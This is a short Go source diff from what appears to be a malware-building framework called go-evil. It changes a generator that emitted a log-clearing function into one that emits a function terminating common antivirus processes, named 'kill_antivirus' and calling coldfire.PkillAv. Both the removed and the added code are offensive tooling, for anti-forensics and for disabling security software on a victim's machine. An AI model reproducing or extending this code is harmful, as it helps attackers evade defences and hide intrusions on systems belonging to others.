@@ -1,4 +1,4 @@
-package system
+package antivirus
 
 import (
 	"fmt"
@@ -6,14 +6,14 @@ import (
 	"github.com/TeamPhoneix/go-evil/utility/structure"
 )
 
-// Tries to clear known logs on the system
-func clear_logs(value string, s_json string) ([]string, string) {
+// Tries to terminate the most common antiviruses
+func Kill(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
-	function_call := "clear_logs"
+	function_call := "kill_antivirus"
 
 	data_object.Add_go_function([]string{
 		fmt.Sprintf("func %s(){", function_call),
-		"err := coldfire.ClearLogs()",
+		"err := coldfire.PkillAv()",
 		"if err != nil{",
 		"spine.log(err.Error())",
 		"}",
